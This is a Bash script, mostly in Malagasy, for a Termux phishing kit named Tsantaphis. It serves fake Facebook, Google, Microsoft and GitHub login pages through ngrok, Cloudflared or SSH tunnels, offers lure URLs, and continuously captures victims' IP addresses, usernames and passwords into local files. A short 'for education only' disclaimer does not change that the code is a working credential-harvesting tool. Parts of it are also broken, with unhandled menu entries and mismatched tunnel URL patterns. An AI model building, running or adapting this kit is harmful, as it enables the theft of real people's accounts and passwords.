#!/data/data/com.termux/files/usr/bin/bash

__version__="2.3.2"

# Loko ampiasaina
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
GREENBG="$(printf '\033[42m')" RESETBG="$(printf '\033[0m')"

# Famoronana lahaharana ilaina (Directories)
if [[ ! -d ".server" ]]; then
    mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
    mkdir -p "auth"
fi

if [[ ! -d ".server/www" ]]; then
    rm -rf .server/www
    mkdir -p .server/www
else
    mkdir -p .server/www
fi

# Fafana ny rakitra taloha raha misy
if [[ -e ".server/locl.txt" ]]; then
    rm -rf .server/locl.txt
fi

if [[ -e ".server/cld.log" ]]; then
    rm -rf .server/cld.log
fi

# Fivoahana rehefa misy manapaka (Ctrl+C)
exit_on_signal_SIGINT() {
    printf "\n\n${RED}[${WHITE}!${RED}]${RED} Najanona vonjy maika ny fandaharana.\n${RESETBG}"
    exit 0
}

exit_on_signal_SIGTERM() {
    printf "\n\n${RED}[${WHITE}!${RED}]${RED} Natsahatra ny fandaharana.\n${RESETBG}"
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
    tput sgr0
    tput op
    return
}

# Famonoana ireo dingana mandeha ambadika
kill_pid() {
    check_PID="php ngrok cloudflared loclx"
    for process in ${check_PID}; do
        if [[ $(pidof ${process}) ]]; then
            killall ${process} > /dev/null 2>&1
        fi
    done
}

# Bannière Tsantaphis miaraka amin'i Figlet
banner() {
    clear
    cat << EOF
${RED}────────────────────────────────────────────────────────────────────────────${RESETBG}
${GREEN}[${WHITE}#${GREEN}][${WHITE}TSANTAPHIS${GREEN}]${CYAN} Novokarin'i FIDIMANANTSOA (Tsanta)${WHITE}──────────────${RESETBG}
${RED}💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀${RESETBG}
${RED}────────────────────────────────────────────────────────────────────────────${RESETBG}
EOF
    figlet -c Tsantaphis
}

banner_small() {
    banner
    cat << EOF
${RED} Tsantaphis - Fitaovana fitiliana sy fiarovana ara-teknolojia.${RESETBG}
EOF
}

# Fametrahana fitaovana ilaina sy fisintonana mivantana (Anisan'izany i figlet)
dependencies() {
    echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Fijerena sy fametrahana ireo fitaovana ilaina (PHP, cURL, Unzip, Figlet)...${WHITE}"
    
    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ ! $(command -v proot) ]]; then
            pkg install proot resolv-conf -y
        fi
        if [[ ! $(command -v tput) ]]; then
            pkg install ncurses-utils -y
        fi
    fi

    pkgs="php curl unzip figlet"
    for pkg in ${pkgs[@]}; do
        type "${pkg}" &> /dev/null || {
            echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Fametrahana an'i : ${ORANGE}${pkg}${WHITE}"
            if [[ $(command -v pkg) ]]; then
                pkg install "${pkg}" -y
            elif [[ $(command -v apt) ]]; then
                sudo apt install "${pkg}" -y
            elif [[ $(command -v apt-get) ]]; then
                sudo apt-get install "${pkg}" -y
            elif [[ $(command -v pacman) ]]; then
                sudo pacman -S "${pkg}" --noconfirm
            elif [[ $(command -v dnf) ]]; then
                sudo dnf -y install "${pkg}"
            elif [[ $(command -v yum) ]]; then
                sudo yum -y install "${pkg}"
            else
                echo -e "${RED}[${WHITE}!${RED}]${RED} Tsy hita ny mpitantana fonosana. Apetraho tanana ny ${pkg}."
                { reset_color; exit 1; }
            fi
        }
    done
}

# Fitaovana fisintonana binaires
download() {
    url="$1"
    output="$2"
    file=$(basename "$url")
    if [[ -e "${file}" ]] || [[ -e ".server/${output}" ]]; then
        rm -rf "${file}" ".server/${output}"
    fi
    curl --silent --insecure --fail --location --output "${file}" "${url}"

    if [[ -e "${file}" ]]; then
        if [[ "${file}" == *.zip ]]; then
            unzip -qq "${file}" > /dev/null 2>&1
            mv -f "${output}" .server/ > /dev/null 2>&1
        elif [[ "${file}" == *.tgz ]]; then
            tar -zxf "${file}" > /dev/null 2>&1
            mv -f "${output}" .server/ > /dev/null 2>&1
        else
            mv -f "${file}" .server/"${output}" > /dev/null 2>&1
        fi
        chmod +x .server/"${output}" > /dev/null 2>&1
        rm -rf "${file}"
    else
        echo -e "${RED}[${WHITE}!${RED}]${RED} Nisy olana tamin'ny fisintonana an'i ${output}.${RESETBG}"
        { reset_color; exit 1; }
    fi
}

install_ngrok() {
    if [[ ! -e ".server/ngrok" ]]; then
        echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Sintomina sy apetraka i Ngrok...${WHITE}"
        arch=$(uname -m)
        if [[ "$arch" == "aarch64" ]]; then
            download 'https://bin.equinox.io/c/bNyj1mQY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
        else
            download 'https://bin.equinox.io/c/bNyj1mQY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
        fi
    fi
}

install_cloudflared() {
    if [[ ! -e ".server/cloudflared" ]]; then
        echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Sintomina sy apetraka i Cloudflared...${WHITE}"
        arch=$(uname -m)
        if [[ "$arch" == "aarch64" ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
        else
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
        fi
    fi
}

install_loclx() {
    if [[ ! -e ".server/loclx" ]]; then
        echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Sintomina sy apetraka i LocalXpose...${WHITE}"
        arch=$(uname -m)
        if [[ "$arch" == "aarch64" ]]; then
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
        else
            download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
        fi
    fi
}

msg_exit() {
    clear
    banner
    echo -e "${GREENBG}${BLACK} Misaotra anao nampiasa an'i Tsantaphis. Mirary andro tsara! ${RESETBG}\n"
    reset_color
    exit 0
}

about() {
    clear
    banner
    cat << EOF
${WHITE}[${RED}-${WHITE}]${RED} Mpanoratra     ${RED}:${RED} ${ORANGE}FIDIMANANTSOA Tsantaniaina (Tsanta)${RED}
${WHITE}[${RED}-${WHITE}]${RED} GitHub         ${RED}:${RED} ${CYAN}https://github.com/tsantaniaina204-cmyk${RED}
${WHITE}[${RED}-${WHITE}]${RED} Dikan-teny     ${RED}:${RED} ${ORANGE}${__version__}${RED}

${WHITE}[${RED}!${WHITE}]${RED} FAMPITANDREMANA:${RESETBG}
${CYAN}Ity fitaovana ity dia natao ho an'ny fianarana sy fitsapana fiarovana ihany.
Ny mpanoratra dia tsy tompon'andraikitra amin'ny fampiasana diso azy.${RED}

${RED}[${RED}00${RED}]${RED} Miverina amin'ny Fizarana Lehibe    ${RED}[${RED}99${RED}]${RED} Mivoahana${RED}
EOF

    read -p "${RED}[${WHITE}-${RED}]${GREEN} tsantaphis > ${BLUE}"
    case $REPLY in
        99) msg_exit ;;
        00) main_menu ;;
        *) echo -e "\n${RED}[${WHITE}!${RED}]${RED} Safidy tsy manan-kery.${WHITE}"; sleep 1; about ;;
    esac
}

HOST="127.0.0.1"
PORT="8080"

cusport() {
    echo -n "${RED}[${WHITE}?${RED}]${ORANGE} Tianao ve ny hampiasa Port hafa? ${GREEN}(y)${CYAN}/${GREEN}(n)${GREEN} [Default:N] : ${ORANGE}"
    read -n1 P_ANS
    if [[ "${P_ANS}" == "y" ]] || [[ "${P_ANS}" == "Y" ]]; then
        printf "\n"
        read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Ampidiro ny Port (ohatra: 8090) : ${WHITE}" CU_P
        if [[ ${CU_P} =~ ^([1-9][0-9]{3})$ ]]; then
            PORT=${CU_P}
        fi
    fi
    echo ""
}

setup_site() {
    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Manamboatra ny tranokala...${WHITE}"
    cp -rf .sites/"$website"/* .server/www/ 2>/dev/null
    cp -f .sites/ip.php .server/www/ 2>/dev/null
    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Manomboka ny server PHP amin'ny Port $PORT...${WHITE}"
    cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

e_ip() {
    IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d'"' -f2 | tr -d '\r')
    echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Hita ny Adiresy IP an'ilay niharam-boina : ${BLUE}$IP"
    echo -e "${RED}[${WHITE}!${RED}]${GREEN} Voatahiry ao amin'ny : ${ORANGE}auth/ip.txt"
    cat .server/www/ip.txt >> auth/ip.txt
}

credentials() {
    ACCOUNT=$(grep -a 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
    PASSWORD=$(grep -a 'Pass:.*' .server/www/usernames.txt | awk -F'"' '{print $NF}')
    echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Kaonty / Anarana : ${BLUE}$ACCOUNT"
    echo -e "${RED}[${WHITE}!${RED}]${GREEN} Teny miafina   : ${BLUE}$PASSWORD"
    echo -e "${RED}[${WHITE}!${RED}]${GREEN} Voatahiry ao amin'ny : ${ORANGE}auth/usernames.dat"
    cat .server/www/usernames.txt >> auth/usernames.dat
    echo -e "${RED}[${WHITE}!${RED}]${ORANGE} Miandry fampahalalana hafa... Tsindrio ${BLUE}Ctrl + C${ORANGE} raha hivoaka."
}

capture_data() {
    echo -e "${RED}[${WHITE}!${RED}]${ORANGE} Miandry ny angona avy amin'ny niharam-boina..."
    while true; do
        if [[ -e ".server/www/ip.txt" ]]; then
            e_ip
            rm -rf .server/www/ip.txt
        fi
        sleep 0.75
        if [[ -e ".server/www/usernames.txt" ]]; then
            credentials
            rm -rf .server/www/usernames.txt
        fi
        sleep 0.75
    done
}

start_ssh_tunnel() {
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Manomboka ny tunnel (Localhost.run)..."
    setup_site
    
    # Nettoyage de l'ancien log
    rm -f .server/ssh.log
    
    # Lancement du tunnel SSH en arrière-plan avec -N et nokey
    ssh -o StrictHostKeyChecking=no -N -R 80:127.0.0.1:$PORT nokey@localhost.run > .server/ssh.log 2>&1 &
    
    echo -e "${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny famoronana ny rohy..."
    sleep 7
    
    clear; banner_small
    echo -e "${RED}[${WHITE}-${RED}]${GREEN} Rohy azo (URL) :"
    
    # Utilisation d'un filtre plus large pour être sûr d'attraper l'URL loca.lt
    grep -o "https://[a-zA-Z0-9.-]*\.loca\.lt" .server/ssh.log
    
    # Si le grep ne trouve rien, on affiche le contenu brut du log pour déboguer
    if [ ! -s .server/ssh.log ]; then
        echo -e "${RED}[${WHITE}!${RED}]${RED} Tsy misy ao amin'ny log ny rohy. Jerena ny olana..."
        cat .server/ssh.log
    fi

    echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny fidiran'ny mpampiasa..."
    capture_data
}

start_ngrok() {
    cusport
    echo -e "${RED}[${WHITE}-${RED}]${GREEN} Alefa i Ngrok (${CYAN}http://$HOST:$PORT${GREEN})..."
    setup_site
    sleep 2 && ./.server/ngrok http "$HOST":"$PORT" --log-stdout /dev/null 2>&1 &
    sleep 5; clear; banner_small
    ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^"]+(.ngrok.io)')
    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Rohy (URL) : ${GREEN}${ngrok_url:-https://ngrok.io}"
    capture_data
}


start_cloudflared() {
    cusport
    echo -e "${RED}[${WHITE}-${RED}]${GREEN} Alefa i Cloudflared..."
    setup_site
    
    # Mandefa an'i cloudflared any ambadika miaraka amin'ny log
    ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    
    echo -e "${RED}[${WHITE}-${RED}]${YELLOW} Andrasana kely ny famoronana ny rohy..."
    
    cldflr_link=""
    counter=0
    while [ -z "$cldflr_link" ]; do
        sleep 2
        counter=$((counter + 2))
        
        if [ -f .server/.cld.log ]; then
            cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .server/.cld.log | head -n 1)
        fi
        
        # Raha mihoatra ny 20 segondra dia mivoaka mba tsy hihitsoka
        if [ $counter -ge 20 ]; then
            echo -e "${RED}[${WHITE}-${RED}]${RED} Hadisoana: Naharitra loatra ny famoronana rohy."
            sleep 3
            main_menu
            return
        fi
    done
    
    clear; banner_small
    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Rohy (URL) : ${GREEN}${cldflr_link}"
    capture_data
}




tunnel_menu() {
    clear; banner_small
    cat << EOF
${RED}[${WHITE}01${RED}]${RED} Localhost    ${RED}[${CYAN}An-toerana${RED}]
${RED}[${WHITE}02${RED}]${RED} Ngrok.io     ${RED}[${CYAN}Mila kaonty${RED}]
${RED}[${WHITE}03${RED}]${RED} Cloudflared  ${RED}[${CYAN}Mandeha ho azy${RED}]
${RED}[${WHITE}04${RED}]${RED} Ssh ${RED}[${CYAN}SSh
EOF

    read -p "${RED}[${WHITE}-${RED}]${GREEN} tsantaphis > ${BLUE}"
    case $REPLY in
        01) setup_site; capture_data ;;
        02) start_ngrok ;;
        03) start_cloudflared ;;
        04) start_ssh_tunnel ;;
        
        *) echo -e "\n${RED}[${WHITE}!${RED}]${RED} Safidy tsy manan-kery.${WHITE}"; sleep 1; tunnel_menu ;;
    esac
}

site_facebook() {
    cat << EOF
${RED}[${WHITE}01${RED}]${RED} Pejy fidirana mahazatra (Traditional)
${RED}[${WHITE}02${RED}]${RED} Pejy fidirana mandroso (Advanced)
EOF
    read -p "${RED}[${WHITE}-${RED}]${GREEN} tsantaphis > ${BLUE}"
    case $REPLY in
        01) website="facebook"; mask="http://blue-verified-badge-for-facebook-free"; tunnel_menu ;;
        02) website="fb_advanced"; mask="http://vote-for-the-best-social-media"; tunnel_menu ;;
        *) echo -e "\n${RED}[${WHITE}!${RED}]${RED} Safidy tsy manan-kery.${WHITE}"; sleep 1; site_facebook ;;
    esac
}

site_instagram() {
    cat << EOF
${RED}[${WHITE}01${RED}]${RED} Pejy fidirana mahazatra
${RED}[${WHITE}02${RED}]${RED} Pejy Auto Followers
EOF
} 
site_google() {
    website="google"
    setup_site
    tunnel_menu
}

site_microsoft() {
    website="microsoft"
    setup_site
    tunnel_menu
}

site_github() {
    website="github"
    setup_site
    tunnel_menu
}
main_menu() {
    clear; banner
    cat << EOF
${RED}[${WHITE}01${RED}]${BLUE} Facebook      ${RED}[${WHITE}06${RED}]${BLUE} Netflix       ${RED}[${WHITE}11${RED}]${BLUE} TikTok
${RED}[${WHITE}02${RED}]${BLUE} Instagram     ${RED}[${WHITE}07${RED}]${BLUE} Paypal        ${RED}[${WHITE}12${RED}]${BLUE} Twitter
${RED}[${WHITE}03${RED}]${BLUE} Google/Gmail  ${RED}[${WHITE}08${RED}]${BLUE} Steam         ${RED}[${WHITE}13${RED}]${BLUE} Discord
${RED}[${WHITE}04${RED}]${BLUE} Microsoft     ${RED}[${WHITE}09${RED}]${BLUE} Spotify       ${RED}[${WHITE}99${RED}]${CYAN} Momba (About)
${RED}[${WHITE}05${RED}]${BLUE} Github        ${RED}[${WHITE}10${RED}]${BLUE} Pinterest     ${RED}[${WHITE}00${RED}]${RED} Mivoahana
EOF

    read -p "${RED}[${WHITE}-${RED}]${GREEN} tsantaphis > ${BLUE}"
    case $REPLY in
        01) site_facebook ;;
        02) site_instagram ;;
        03) site_google ;;
        04) site_microsoft ;;
        05) site_github ;;
        99) about ;;
        00) msg_exit ;;
        *) echo -e "\n${RED}[${WHITE}!${RED}]${RED} Safidy tsy manan-kery.${WHITE}"; sleep 1; main_menu ;;
    esac
}

# Famelomana voalohany
kill_pid
dependencies
install_cloudflared
main_menu 
